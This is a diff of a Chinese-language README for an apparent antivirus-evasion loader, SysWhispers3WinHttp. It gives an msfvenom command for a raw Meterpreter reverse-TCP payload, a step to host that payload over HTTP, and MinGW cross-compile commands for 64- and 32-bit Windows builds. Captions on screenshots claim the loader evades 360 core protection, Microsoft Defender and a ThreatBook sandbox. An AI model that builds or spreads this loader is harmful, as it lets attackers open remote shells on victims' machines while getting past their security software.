@@ -17,19 +17,22 @@ msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.110 lport=4444 -f ra
 // 2. 使用python3开启Web服务（或使用CobaltStrike之Host File功能）
 python3 -m http.server
 
-// 3. 修改SysWhispers3WinHttp.c第40行IP地址并使用Linux GCC进行交叉编译
+// 3. 修改SysWhispers3WinHttp.c第40行IP地址，使用Linux64位GCC进行交叉编译
 x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -O1
+
+// 4. 或修改SysWhispers3WinHttp.c第4行头文件为syscalls.h与第40行IP地址，使用Linux32位GCC进行交叉编译
+i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -O1
 ```
 
 ## 0x03 演示：
 
-360核晶截图（2023/06/06更新）
+360核晶（2023/06/06更新）
 ![360](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/b4534cba-2b86-47d7-bcf3-553739e2012b)
 
-Defender截图（2023/06/06更新）
+Defender（2023/06/06更新）
 ![WD](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/a134f8bd-922d-4132-af9d-c8eee6b07fc1)
 
-微步云沙箱截图
+微步云沙箱
 ![threatbook](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/bfd99aee-6f82-4960-a461-12c1b83b594a)
 
 ## 0x04 参考：
